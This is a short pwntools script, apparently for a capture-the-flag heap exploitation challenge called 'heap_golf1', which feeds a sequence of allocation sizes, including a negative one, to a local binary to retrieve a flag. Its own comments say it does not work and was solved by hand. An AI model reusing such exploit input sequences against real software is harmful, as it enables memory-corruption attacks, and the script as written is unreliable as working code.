from pwn import *

elf = ELF("./heap_golf1",checksec=False)

# DOES NOT WORK
# pwntools does not recv/send any data from the binary :/
# Just solve it manually
p = process([elf.path])
p.interactive()
p.recvuntil(b"provision:")
p.sendline(b"32")
p.recvuntil(b"provision:")
p.sendline(b"-2")
p.recvuntil(b"provision:")
p.sendline(b"99")
p.recvuntil(b"provision:")
p.sendline(b"99")
p.recvuntil(b"provision:")
p.sendline(b"99")
p.recvuntil(b"provision:")
p.sendline(b"32")
log.info(f"Flag: {p.recvline().decode()}")

